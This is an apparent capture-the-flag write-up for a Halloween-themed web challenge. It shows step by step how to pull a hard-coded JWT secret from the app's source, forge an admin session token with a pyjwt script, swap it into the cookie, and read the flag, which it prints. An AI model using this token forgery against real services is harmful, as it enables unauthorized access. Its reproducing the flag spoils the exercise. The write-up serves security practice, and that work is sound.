## Description
(NOTE: use https:// to connect to the instance) Hidden in the shadows, a coven of witches communicates through arcane tokens, their messages cloaked in layers of dark enchantments. These enchanted tokens safeguard their cryptic conversations, masking sinister plots that threaten to unfold under the veil of night. However, whispers suggest that their protective spells are flawed, allowing outsiders to forge their own charms. Can you exploit the weaknesses in their mystical seals, craft a token of your own, and infiltrate their circle to thwart their nefarious plans before the next moon rises?


## Steps

1. Navigate to https://IP:PORT

2. Enter Name: admin and description: anything

3. intercept the request through burpsuite and u can see the session is JWT token

4. decode it as base64 decode | change the username to admin

5. go to https://jwt.io/ and put the jwt session token with admin uesrname 

6. navigate into the files 

| cd src
cat util.js
-> the secret key for the session token is halloween-secret

7. Manually Generate JWT (Python)

If you prefer Python, use the pyjwt library:

import jwt

secret = "halloween-secret"
payload = {"username": "admin"}
token = jwt.encode(payload, secret, algorithm="HS256")

print(token)

| python3 file.py 

8. take the generated session token -> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.cZWxa1K7QYrrER18LTTA6BFtEt79_e_zcK4TIVdFNH8

9. navigate to https://IP:PORT/tickets and put the session token above in the cookies value and refresh the page

10. flag: HTB{k33p_th3s3_jwt_s3cr3t_s4f3f_br0}
